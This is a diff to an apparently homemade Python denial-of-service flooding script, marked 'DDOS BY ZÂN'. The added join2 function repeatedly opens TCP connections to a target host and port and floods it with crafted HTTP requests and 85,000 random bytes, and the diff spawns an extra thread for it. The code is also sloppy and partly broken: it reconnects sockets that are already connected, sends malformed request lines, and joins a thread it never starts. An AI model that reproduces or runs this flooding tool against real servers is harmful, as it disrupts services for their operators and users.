@@ -192,13 +192,38 @@ def join():
            s.send(str.encode(main_req))
            for i in range(pack):
                s.connect((str(ip),int(port)))
-               s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.send(str.encode(main_req))
                print("[!] DDOS BY ZÂN [!]")
         except:
              s.close()
              print('[+] server error')
-
+def join2():
+  global useragents, ref, socks5
+  data = hh._urandom(85000)
+  data2 = int(0)
+  userbig = "UserAgents: "+random.choice(useragents)+random.choice(socks5)+"\r\n"
+  reflol = random.choice(ref)+"\r\n"
+  sock = random.choice(socks5)+"\r\n"
+  get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
+  post_host = "POST /Attacked-by-HAHA HTTP/1.1\r\nHost: " + ip + "\r\n"
+  get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
+  while  True:
+         try:
+            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM )
+            s.connect((str(ip),int(port)))
+            s.send(str.encode(main_req))
+            s.send((data))
+            for x in range(pack):
+              s.connect((str(ip),int(port)))
+              s.send(str.encode(main_req))
+              s.send((data))
+              print("[!] DDOS BY ZÂN [!]")
+         except:
+              s.close()
+              print('[+] server error')
+              
 for x in range(th):
   th = threading.Thread(target=join)
+  th2 = threading.Thread(target=join2)
   th.start()
+  th2.join()
